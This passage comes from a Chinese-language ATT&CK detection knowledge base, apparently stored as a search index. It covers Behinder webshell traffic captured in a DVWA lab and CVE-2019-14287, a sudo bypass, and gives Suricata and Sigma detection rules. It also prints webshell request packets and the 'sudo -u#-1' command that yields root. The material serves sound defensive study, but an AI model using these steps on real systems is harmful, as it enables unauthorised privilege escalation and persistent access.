1f4c0\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09","title":"2\uff09\u51b0\u874e\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u6d41\u91cf"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#3vs","text":"\u4ece\u4e2d\u53ef\u4ee5\u770b\u5230\u51b0\u874eV1.0\u7248\u672c\u5728\u521d\u671f\u4ea4\u4e92\u901a\u8baf\u65f6\uff0c\u7279\u5f81\u8f83\u4e3a\u660e\u663e\uff0cuser-agent\u4e0e\u6b63\u5e38\u4e1a\u52a1\u6d41\u91cf\u660e\u663e\u4e0d\u540c\u3002\u53ef\u4ee5\u901a\u8fc7\u5bf9 user-agent \u8fdb\u884c\u68c0\u6d4b\u5206\u6790\u3002\u5176\u6b21\u5728POST\u8fd4\u56de\u5305\u4e2d\u76f8\u5bf9\u6b63\u5e38\u6d41\u91cf\u591a\u4e86 Transfer-Encoding: chunked \uff0cTransfer-Encoding\u4e3b\u8981\u662f\u7528\u6765\u6539\u53d8\u62a5\u6587\u683c\u5f0f\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u5229\u7528\u5206\u5757\u8fdb\u884c\u4f20\u8f93\u3002\u4f60\u53ef\u4ee5\u57fa\u4e8e\u6b64\u7279\u5f81\u503c\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u6bd4\u5982url\u4e2d\u5305\u542b .php?pass= \u6765\u8fdb\u884c\u68c0\u6d4b\u3002","title":"3\uff09\u6b63\u5e38\u6d41\u91cfVS\u51b0\u874e\u901a\u8baf\u6d41\u91cf"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v21","text":"\u4ece\u51b0\u874eV1.1\u5f00\u59cb\u65b0\u589e\u968f\u673aUserAgent\u652f\u6301\uff0c\u6bcf\u6b21\u4f1a\u8bdd\u4f1a\u4ece17\u79cd\u5e38\u89c1UserAgent\u4e2d\u968f\u673a\u9009\u53d6\u3002\u51b0\u874e\u6700\u65b0\u7248\u672c\u4e3aV2.1\uff0c\u53ef\u4ee5\u901a\u8fc7\u5bf92.1\u7248\u672c\u670d\u52a1\u7aef\u4e0e\u5ba2\u6237\u7aef\u7684\u901a\u4fe1\u6d41\u91cf\uff0c\u8fdb\u884c\u6355\u83b7\uff0c\u5bf9\u6bd4\u6b63\u5e38\u6d41\u91cf\u8fdb\u884c\u5206\u6790\u3002","title":"\u51b0\u874eV2.1"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#1a","text":"GET\u8bf7\u6c42\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 GET\u8bf7\u6c42\u8fd4\u56de\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 POST\u8bf7\u6c42\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282 POST\u8fd4\u56de\u5305 a \u540c\u51b0\u874eV1.0\u7ae0\u8282","title":"1\uff09\u6b63\u5e38\u6d41\u91cfa"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#2a","text":"GET\u8bf7\u6c42\u5305 a GET /DVWA/hackable/uploads/shell.php?pass=673 HTTP/1.1 Content-type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3) Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive **GET\u8bf7\u6c42\u8fd4\u56de\u5305**a HTTP/1.1 200 OK Date: Mon, 19 Aug 2019 09:34:36 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Set-Cookie: PHPSESSID=m0agat42tmo0i4srnda5ssfq94; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 16 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html 03befc81cbefda94 POST\u8bf7\u6c42\u5305 POST /DVWA/hackable/uploads/shell.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID=bv5lv0681hq09ggt8rfj1peio5; path=/ User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3) Cache-Control: no-cache Pragma: no-cache Host: 192.168.66.136 Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 2220 ltEi32XJreSl8Y5Hhzk08Wgjfe8bLPr3x8n4qlJ\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09 POST\u8fd4\u56de\u5305 HTTP/1.1 200 OK Date: Mon, 19 Aug 2019 09:34:36 GMT Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45 X-Powered-By: PHP/5.4.45 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=97 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html 21dc0gfUOcrBcH7jint5L0pmkDxT5ypIbjLnIsXnDxHGjofQk3g\uff08\u6b64\u5904\u7701\u7565\u52a0\u5bc6\u5b57\u7b26\u4fe1\u606f\uff09","title":"2\uff09\u51b0\u874e\u5ba2\u6237\u7aef\u4e0e\u670d\u52a1\u7aef\u901a\u4fe1\u6d41\u91cfa"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#3vsa","text":"\u901a\u8fc7\u5bf9\u6bd4\u53ef\u4ee5\u770b\u5230\uff0c\u51b0\u874eV2.1\u5728\u521d\u671f\u4ea4\u4e92\u901a\u8baf\u65f6\u6d41\u91cf\u4e2d\u591a\u4e86 Transfer-Encoding: chunked \uff0cTransfer-Encoding\u4e3b\u8981\u662f\u7528\u6765\u6539\u53d8\u62a5\u6587\u683c\u5f0f\uff0c\u8fd9\u91cc\u6307\u7684\u662f\u5229\u7528\u5206\u5757\u8fdb\u884c\u4f20\u8f93\u3002\u4f60\u53ef\u4ee5\u57fa\u4e8e\u6b64\u7279\u5f81\u503c\u8fdb\u884c\u68c0\u6d4b\uff0c\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u7528\u66f4\u7b80\u5355\u7684\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u6bd4\u5982url\u4e2d\u5305\u542b .php?pass= \u6765\u8fdb\u884c\u68c0\u6d4b\u3002","title":"3\uff09\u6b63\u5e38\u6d41\u91cfVS\u51b0\u874e\u901a\u8baf\u6d41\u91cfa"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_5","text":"","title":"\u68c0\u6d4b\u7279\u5f81/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v10a","text":"\u57fa\u4e8eGET\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aurl\u5305\u542b.php?pass=\uff0cuseragent\u5305\u542bJava/*\uff1b \u57fa\u4e8ePOST\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1auseragent\u5305\u542bJava/* \uff0c\u8fd4\u56de\u5305\u5305\u542b\uff1aTransfer-Encoding: chunked\uff1b","title":"\u51b0\u874eV1.0a"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#v21a","text":"\u57fa\u4e8eGET\u8bf7\u6c42\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aurl\u5305\u542b.php?pass=\uff1b\uff08\u5982\u679c\u4e0e\u4e1a\u52a1\u51b2\u7a81\uff0c\u8bef\u62a5\u8f83\u5927\uff09 \u57fa\u4e8ePOST\u8fd4\u56de\u5305\u7684\u68c0\u6d4b\u7279\u5f81\uff1aTransfer-Encoding: chunked\uff1b","title":"\u51b0\u874eV2.1a"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev2.0/#_6","text":"MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ \u51b0\u874e\u4e0b\u8f7d\u5730\u5740 https://github.com/rebeyond/Behinder/releases","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/","text":"T1505-003-webshell-\u51b0\u874e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Webshell\u662f\u4e00\u4e2aWeb\u811a\u672c\uff0c\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u7f51\u7edc\u7684\u7f51\u5173\u3002 Web shell\u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u529f\u80fd\uff0c\u5982\u865a\u62df\u7ec8\u7aef\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWebshell\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4e0e\u7ba1\u7406Web\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff08\u4f8b\u5982\uff0c\u4e2d\u56fd\u83dc\u5200\u3001C\u5200\u3001\u8681\u5251\u3001\u51b0\u874e\u7b49\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0\uff0c\u53ef\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\uff1b \u68c0\u6d4b\u65e5\u5fd7 HTTP\u6d41\u91cf \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0\uff0c\u5efa\u8bae\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\uff1b \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0\uff0c\u5efa\u8bae\u672c\u5730\u81ea\u884c\u6d4b\u8bd5\uff0c\u6293\u53d6\u6d41\u91cf\u6570\u636e\uff1b \u68c0\u6d4b\u89c4\u5219/\u601d\u8def suricata\u89c4\u5219 \u53c2\u8003\u6765\u6e90\uff1a https://github.com/suricata-rules/suricata-rules/tree/master/Behinder alert http any any -> any any (msg: \"Behinder3 PHP HTTP Request\"; flow: established, to_server; content:\".php\"; http_uri; pcre:\"/[a-zA-Z0-9+/]{1000,}=/i\"; flowbits:set,behinder3;noalert; classtype:shellcode-detect; sid: 3016017; rev: 1; metadata:created_at 2020_08_17,by al0ne;) alert http any any -> any any (msg: \"Behinder3 PHP HTTP Response\"; flow: established,to_client; content:\"200\"; http_stat_code; flowbits: isset,behinder3; pcre:\"/[a-zA-Z0-9+/]{100,}=/i\"; classtype:shellcode-detect; sid: 3016018; rev: 1; metadata:created_at 2020_08_17,by al0ne;) \u81ea\u5b9a\u4e49\u68c0\u6d4b\u89c4\u5219 \u81ea\u5b9a\u4e49\u89c4\u5219\u8fdb\u884c\u9632\u62a4\uff1a(uri_path * rco \\.(jsp|jspx|php)$)&&(method * belong POST)&&(request_body * req ^[\\w+/]{1000,}=?=?$) \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ \u51b0\u874e3.0\u6d41\u91cf\u7279\u5f81\u5206\u6790\u9644\u7279\u5f81 https://mp.weixin.qq.com/s/XMLK5OCpH9pICD9EL9nugA \u51b0\u874e\u7684\u524d\u4e16\u4eca\u751f:3.0\u65b0\u7248\u672c\u4e0b\u7684\u4e00\u4e9b\u9632\u62a4\u601d\u8003 https://mp.weixin.qq.com/s/WYM3J3daMTFODr4BSkKzxg","title":"T1505-003-webshell-\u51b0\u874e"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#t1505-003-webshell-","text":"","title":"T1505-003-webshell-\u51b0\u874e"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#attck","text":"Webshell\u662f\u4e00\u4e2aWeb\u811a\u672c\uff0c\u653e\u7f6e\u5728\u53ef\u516c\u5f00\u8bbf\u95ee\u7684Web\u670d\u52a1\u5668\u4e0a\uff0c\u5141\u8bb8\u653b\u51fb\u8005\u5c06Web\u670d\u52a1\u5668\u7528\u4f5c\u7f51\u7edc\u7684\u7f51\u5173\u3002 Web shell\u53ef\u4ee5\u63d0\u4f9b\u591a\u79cd\u529f\u80fd\uff0c\u5982\u865a\u62df\u7ec8\u7aef\u3001\u6587\u4ef6\u7ba1\u7406\u3001\u6570\u636e\u5e93\u8fde\u63a5\u7b49\u3002 \u9664\u4e86\u670d\u52a1\u5668\u7aef\u811a\u672c\u4e4b\u5916\uff0cWebshell\u53ef\u80fd\u8fd8\u6709\u4e00\u4e2a\u5ba2\u6237\u7aef\u63a5\u53e3\u7a0b\u5e8f\uff0c\u7528\u4e8e\u4e0e\u7ba1\u7406Web\u670d\u52a1\u5668\u7684\u901a\u4fe1\uff08\u4f8b\u5982\uff0c\u4e2d\u56fd\u83dc\u5200\u3001C\u5200\u3001\u8681\u5251\u3001\u51b0\u874e\u7b49\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_1","text":"\u6682\u65e0\uff0c\u53ef\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\uff1b","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_2","text":"HTTP\u6d41\u91cf","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_3","text":"\u6682\u65e0\uff0c\u5efa\u8bae\u81ea\u884c\u672c\u5730\u6d4b\u8bd5\uff1b","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_4","text":"\u6682\u65e0\uff0c\u5efa\u8bae\u672c\u5730\u81ea\u884c\u6d4b\u8bd5\uff0c\u6293\u53d6\u6d41\u91cf\u6570\u636e\uff1b","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#suricata","text":"\u53c2\u8003\u6765\u6e90\uff1a https://github.com/suricata-rules/suricata-rules/tree/master/Behinder alert http any any -> any any (msg: \"Behinder3 PHP HTTP Request\"; flow: established, to_server; content:\".php\"; http_uri; pcre:\"/[a-zA-Z0-9+/]{1000,}=/i\"; flowbits:set,behinder3;noalert; classtype:shellcode-detect; sid: 3016017; rev: 1; metadata:created_at 2020_08_17,by al0ne;) alert http any any -> any any (msg: \"Behinder3 PHP HTTP Response\"; flow: established,to_client; content:\"200\"; http_stat_code; flowbits: isset,behinder3; pcre:\"/[a-zA-Z0-9+/]{100,}=/i\"; classtype:shellcode-detect; sid: 3016018; rev: 1; metadata:created_at 2020_08_17,by al0ne;)","title":"suricata\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_6","text":"\u81ea\u5b9a\u4e49\u89c4\u5219\u8fdb\u884c\u9632\u62a4\uff1a(uri_path * rco \\.(jsp|jspx|php)$)&&(method * belong POST)&&(request_body * req ^[\\w+/]{1000,}=?=?$)","title":"\u81ea\u5b9a\u4e49\u68c0\u6d4b\u89c4\u5219"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_7","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1505-003-webshell-%E5%86%B0%E8%9D%8Ev3.0/#_8","text":"MITRE-ATT&CK-T1505-003 https://attack.mitre.org/techniques/T1505/003/ \u51b0\u874e3.0\u6d41\u91cf\u7279\u5f81\u5206\u6790\u9644\u7279\u5f81 https://mp.weixin.qq.com/s/XMLK5OCpH9pICD9EL9nugA \u51b0\u874e\u7684\u524d\u4e16\u4eca\u751f:3.0\u65b0\u7248\u672c\u4e0b\u7684\u4e00\u4e9b\u9632\u62a4\u601d\u8003 https://mp.weixin.qq.com/s/WYM3J3daMTFODr4BSkKzxg","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/","text":"T1548-003-linux-CVE-2019-14287 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 sudoers\u6587\u4ef6 /etc/sudoers \u63cf\u8ff0\u4e86\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u8fd0\u884c\u54ea\u4e9b\u547d\u4ee4\u4ee5\u53ca\u4ece\u54ea\u4e9b\u7ec8\u7aef\u8fd0\u884c\u3002\u8fd9\u8fd8\u63cf\u8ff0\u4e86\u7528\u6237\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u7528\u6237\u6216\u7ec4\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u63d0\u4f9b\u4e86\u6700\u5c0f\u7279\u6743\u7684\u6982\u5ff5\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u5927\u591a\u6570\u65f6\u95f4\u4ee5\u6700\u4f4e\u53ef\u80fd\u7684\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u4ec5\u5728\u9700\u8981\u65f6\u63d0\u5347\u5230\u5176\u4ed6\u7528\u6237\u6216\u6743\u9650\uff0c\u901a\u5e38\u901a\u8fc7\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u4f46\u662f\uff0csudoers\u6587\u4ef6\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4f55\u65f6\u4e0d\u63d0\u793a\u7528\u6237\u8f93\u5165\u7c7b\u4f3c user1 ALL=(ALL) NOPASSWD: ALL [ 1] \u7684\u884c\u7684\u5bc6\u7801\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u914d\u7f6e\u6765\u6267\u884c\u5176\u4ed6\u7528\u6237\u7684\u547d\u4ee4\u6216\u751f\u6210\u5177\u6709\u66f4\u9ad8\u6743\u9650\u7684\u8fdb\u7a0b\u3002\u60a8\u5fc5\u987b\u5177\u6709\u63d0\u5347\u6743\u9650\u624d\u80fd\u7f16\u8f91\u6b64\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b CVE-2019-14287 _ \u5982\u679c\u5c06sudo\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237\u901a\u8fc7Runas\u89c4\u8303\u4e2d\u5b9a\u4e49\u7684ALL\u5173\u952e\u5b57\u6765\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u7684\u8bdd\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c06\u6709\u53ef\u80fd\u901a\u8fc7\u5236\u5b9a\u7528\u6237ID -1\u62164294967295\u6765\u4ee5root\u6743\u9650\u6267\u884c\u6076\u610f\u547d\u4ee4\u3002 \u5f53sudo\u88ab\u914d\u7f6e\u4e3a \u3010\u5141\u8bb8\u7528\u6237\u57fa\u4e8eRunas\u89c4\u8303\u4e2d\u5b9a\u4e49\u7684ALL\u5173\u952e\u5b57\uff0c\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3011\u65f6\uff0c\u53ef\u4ee5\u901a\u8fc7\u6307\u5b9a\u7279\u5b9a\u7684\u7528\u6237id\uff08\u5982-1\u6216\u80054294967295\uff09\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\uff0c\u5c3d\u7ba1Runas\u89c4\u8303\u4e2d\u660e\u786e\u89c4\u8303\u4e86\u7981\u6b62root\u8bbf\u95ee\uff0c\u4f46\u53ea\u8981Runas\u89c4\u8303\u4e2d\u4f18\u5148\u51fa\u73b0\u4e86ALL\u5173\u952e\u5b57\uff0c\u5177\u6709\u8db3\u591fsudo\u7279\u6743\u7684\u7528\u6237\u5c31\u53ef\u4ee5\u4f7f\u7528\u6b64\u547d\u4ee4\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4 \u4ee5\u8fd9\u79cd\u65b9\u5f0f\u8fd0\u884c\u7684\u547d\u4ee4\uff0c\u65e5\u5fd7\u4f1a\u628a\u7528\u6237id\u8bb0\u5f55\u4e3a4294967295\uff0c\u800c\u975eroot\u3002\u6b64\u5916\uff0cPAM\u4f1a\u8bdd\u4e0d\u4f1a\u5e72\u9884\u6b64\u547d\u4ee4\u7684\u6267\u884c\u3002 #Runas\u89c4\u8303\uff1a\u6307sudo\u914d\u7f6e\u6587\u4ef6\uff08\u4e00\u822c\u4e3a/etc/sudoers\uff09 \u4e2d\u5b9a\u4e49\u7684\u7528\u6237\u6267\u884c\u6743\u9650\u89c4\u5219 #PAM\uff08\u53ef\u63d2\u5165\u8eab\u4efd\u9a8c\u8bc1\u6a21\u5757\uff09\uff1aPAM\u5c06\u7a0b\u5e8f\u5f00\u53d1\u4e0e\u8ba4\u8bc1\u65b9\u5f0f\u8fdb\u884c\u5206\u79bb\uff0c\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6\u8c03\u7528\u9644\u52a0\u7684\u201c\u8ba4\u8bc1\u201d\u6a21\u5757\u5b8c\u6210\u81ea\u5df1\u7684\u5de5\u4f5c\u3002\u672c\u5730\u7cfb\u7edf\u7ba1\u7406\u5458\u901a\u8fc7\u914d\u7f6e\u9009\u62e9\u8981\u4f7f\u7528\u67d0\u79cd\u8ba4\u8bc1\u6a21\u5757\u3002 \u5f71\u54cd\u7248\u672c \uff1asudo 1.8.28 \u4ee5\u4e0b\u7248\u672c \u68c0\u6d4b\u65e5\u5fd7 linux auth.log\u65e5\u5fd7\uff0c\u65e0\u9700\u523b\u610f\u914d\u7f6e\u3002 \u6a21\u62df\u73af\u5883\uff1aubuntu 19.04 \u6d4b\u8bd5\u590d\u73b0 \u6b65\u9aa4\u5982\u4e0b\uff1a 1\u3001\u521b\u5efa\u666e\u901a\u7528\u6237\u8d26\u6237\uff1b 2\u3001\u5207\u6362root\u6743\u9650\uff0c\u4fee\u6539/etc/sudoers \u914d\u7f6e\u6587\u4ef6\u5199\u5165\u5982\u4e0b\u89c4\u5219 abc ALL = (ALL, !root) /usr/bin/vi 3\u3001\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u4fee\u6539/etc/sudoers\u7684\u8bfb\u5199\u6743\u9650\uff0c\u5426\u5219\u4f60\u65e0\u6cd5\u5bf9\u6b64\u6587\u4ef6\u8fdb\u884c\u5199\u5165\u3002\u540c\u65f6\uff0c\u5728\u5199\u5165\u5b8c\u6210\u4e4b\u540e\uff0c\u4f60\u9700\u8981\u4fee\u6539\u6b64\u6587\u4ef6\u7684\u6743\u9650\u4e3a\u53ea\u8bfb chmod u+w /etc/sudoers \uff08\u4fee\u6539\u6743\u9650\uff0c\u9ed8\u8ba4\u53ea\u8bfb\uff09 chmod u-w /etc/sudoers \uff08\u53ea\u8bfb\u6743\u9650\uff0c\u5f88\u91cd\u8981\uff09 4\u3001\u6d4b\u8bd5\uff1a\u6267\u884csudo vi \u65e0\u6743\u9650 \u200b \u6267\u884csudo -u#-1 vi \u7a81\u7834\u9650\u5236\u6210\u529f\u4ee5root\u8eab\u4efd\u6267\u884c \u6d4b\u8bd5\u7559\u75d5 Oct 18 11:09:54 icbc sudo: test321 : TTY=pts/1 ; PWD=/ ; USER=#-1 ; COMMAND=/usr/bin/id Oct 18 11:11:59 icbc sudo: test321 : TTY=pts/1 ; PWD=/ ; USER=#4294967295 ; COMMAND=/usr/bin/id \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: CVE-2019-14287 sudo \u914d\u7f6e\u4e0d\u5f53-\u6743\u9650\u63d0\u5347 description: Ubuntu19.04 x64\u6d4b\u8bd5\u7ed3\u679c\uff08\u5f53sudo\u914d\u7f6e\u4e3a\u5141\u8bb8\u7528\u6237\u901a\u8fc7Runas\u89c4\u8303\u4e2d\u7684ALL\u5173\u952e\u5b57\u4ee5\u4efb\u610f\u7528\u6237\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\u65f6\uff0c\u53ef\u4ee5\u6309\u901a\u8fc7\u6307\u5b9a\u7528\u6237ID-1\u62164294967295\u6210\u4e3aroot\u7528\u6237\u3002\u5177\u6709\u8db3\u591fsudo\u7279\u6743\u7684\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u4ee5root\u8eab\u4efd\u8fd0\u884c\u547d\u4ee4\uff0c\u5373\u4f7fRunas\u89c4\u8303\u660e\u786e\u7981\u6b62root\u7528\u6237\u8bbf\u95ee\uff0c\u53ea\u8981\u5728Runas\u89c4\u8303 \u6761\u4ef6\u4e2d\u9996\u5148\u5217\u51faALL\u5173\u952e\u5b57\u5373\u53ef\uff09 references: https://sysdig.com/blog/detecting-cve-2019-14287/ tags: T1548-003 status: experimental author: Blue team logsource: product: linux detection: selection: proc.name: 'sudo:' proc.USER: - '#-1' - '#4294967295' condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u7f13\u89e3\u63aa\u65bd \u76ee\u524d\u4e3b\u8981\u5f71\u54cd\u4ee5\u4e0b\u7248\u672c\uff1a sudo -V < 1.8.28 \u5347\u7ea7sudo\u7248\u672c\u81f31.8.28\u4ee5\u4e0a \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1548-003 https://attack.mitre.org/techniques/T1548/003/ \u68c0\u6d4bCVE-2019-14287 https://sysdig.com/blog/detecting-cve-2019-14287/","title":"T1548-003-linux-CVE-2019-14287"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#t1548-003-linux-cve-2019-14287","text":"","title":"T1548-003-linux-CVE-2019-14287"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1548-003-linux-CVE-2019-14287/#attck","text":"sudoers\u6587\u4ef6 /etc/sudoers \u63cf\u8ff0\u4e86\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u8fd0\u884c\u54ea\u4e9b\u547d\u4ee4\u4ee5\u53ca\u4ece\u54ea\u4e9b\u7ec8\u7aef\u8fd0\u884c\u3002\u8fd9\u8fd8\u63cf\u8ff0\u4e86\u7528\u6237\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u7528\u6237\u6216\u7ec4\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u8fd9\u63d0\u4f9b\u4e86\u6700\u5c0f\u7279\u6743\u7684\u6982\u5ff5\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u5927\u591a\u6570\u65f6\u95f4\u4ee5\u6700\u4f4e\u53ef\u80fd\u7684\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u4ec5\u5728\u9700\u8981\u65f6\u63d0\u5347\u5230\u5176\u4ed6\u7528\u6237\u6216\u6743\u9650\uff0c\u901a\u5e38\u901a\u8fc7\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u4f46\u662f\uff0csudoers\u6587\u4ef6\u8fd8\u53ef\u4ee5\u6307\u5b9a\u4f55\u65f6\u4e0d